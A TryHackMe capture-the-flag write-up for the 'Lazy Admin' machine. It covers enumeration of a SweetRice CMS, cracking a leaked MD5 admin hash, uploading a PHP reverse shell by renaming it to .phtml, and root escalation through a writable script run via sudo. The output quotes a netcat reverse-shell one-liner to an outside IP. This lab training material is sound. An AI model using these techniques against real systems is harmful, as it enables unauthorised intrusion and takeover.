# TryHackMe - Lazy Admin (Write-Up)

_5 min read · March 1, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Lazy Admin**](https://tryhackme.com/room/lazyadmin) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Obtain User and Root Flag
- Difficulty: Easy
- Machine Author: MrSeth6797

---

## Scanning for Open Ports

The machine IP address in my case is **10.48.133.83**.

As usual:

```bash
nmap -T4 -p- 10.48.133.83
sudo nmap -sCV -p 22,80 10.48.133.83
```

![Nmap Output](./img/thm-lazyadmin/Nmap-output.png)

From the scan result, I noticed that:

- SSH (port 22) is open.
- HTTP (port 80) is open.

As usual, I browsed the site first.

![Lazy Admin: Website](./img/thm-lazyadmin/web.png)

It was just the default Apache2 Ubuntu page. I also checked the source code but didn't find anything interesting.

---

## Futher Enumeration on the Website

I used [**Gobuster**](https://www.kali.org/tools/gobuster/) to enumerate the site.

```bash
gobuster dir -u http://10.48.133.83/ -w /usr/share/wordlists/dirb/big.txt
```

![Gobuster Output](./img/thm-lazyadmin/gobuster-output.png)

Then I accessed `/content` directory.

![Lazy Admin: Website /content](./img/thm-lazyadmin/web-content.png)

As shown here, the site was running **SweetRice CMS**.

I continued enumerating.

```bash
gobuster dir -u http://10.48.133.83/content -w /usr/share/wordlists/dirb/big.txt
```

![Gobuster Output 2](./img/thm-lazyadmin/gobuster-output-2.png)

From the results"

- `/as` is the admin login page.
- `/attachment` might store uploaded files.
- `/inc/mysql_backup` contains **MySQL** backup file.

I downloaded the backup file:

```bash
wget http://10.48.133.83/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

After reading the file, I found credentials.

```output
s:5:\\"admin\\";s:7:\\"manager\\";
s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";
```

The password looked like a hash, so I checked its type using [**hash-identifier**](https://www.kali.org/tools/hash-identifier/).

```bash
hash-identifier 42f749ade7f9e195bf475f37a44cafcb
```

```output
Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Then I cracked it using [**hashcat**](https://www.kali.org/tools/hashcat/).

```bash
hashcat -m 0 -a 0 42f749ade7f9e195bf475f37a44cafcb /usr/share/wordlists/rockyou.txt
```

```output
Password123
```

---

## Exploitation

After logging in at `/as`, I explored the dashboard and found database credentials under Settings → General.

I also found a file upload feature under Post → Create.

![Lazy Admin: Dashboard Create Post](./img/thm-lazyadmin/web-create-post.png)

I copied the PHP reverse shell available on my machine:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

I then modified the IP address and port inside the script.

Then I created a post and uploaded the PHP reverse shell file. However, it didn't appear in the `/attachment` directory. It seems the `.php` extension was not allowed.

To bypass this restriction, I changed the extension to `.phtml` and uploaded it again.

This time, the file was uploaded successfully.

I set up a listener using [**netcat**](https://www.kali.org/tools/netcat/):

```bash
nc -lvp 4418
```

Then I clicked the uploaded file in `/attachment` and received a reverse shell.

---

## Post-Exploitation

After gaining shell access, I found the **user flag** inside `/home/itguy` directory.

![User Flag](./img/thm-lazyadmin/user-flag.png)

Then I checked the `mysql_login.txt`:

```output
rice:randompass
```

These credentials were the same as the ones found in dashboard under Settings → General.

I checked if **MySQL** was running:

```bash
ss -tulpn
```

```output
tcp    LISTEN     0      80     127.0.0.1:3306
```

After connecting and checking the database, however, I didn't find anything useful there.

---

## Privilege Escalation

Next I performed my usual privilege escalation checklist.

```bash
sudo -l
```

```output
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

This means I can run `backup.pl` as root without password.

I checked the file permissions:

```output
-rw-r--r-x 1 root root 47 Nov 29  2019 backup.pl
```

Then I read its content:

```output
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

So when `backup.pl` is executed, it runs `/etc/copy.sh`.

I checked the permissions `copy.sh`:

```output
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

The script was writable.

Then I read its content:

```output
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

I replaced its content with:

```bash
echo "bash -p" > /etc/copy.sh
```

Then I executed:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

This spawned a root shell.

I navigated to `/root` and retrieved the **root flag**.

```bash
cd /root
cat root.txt
```

![Root Flag](./img/thm-lazyadmin/root-flag.png)

Bomba! Settleee.

---

## Session Terminated

From this machine, I learned how to:

- enumerate CMS directories and identify sensitive backup files
- exploit file upload functionality for remote code execution
- abuse writable scripts executed as root

Thank you for reading and see you next time!
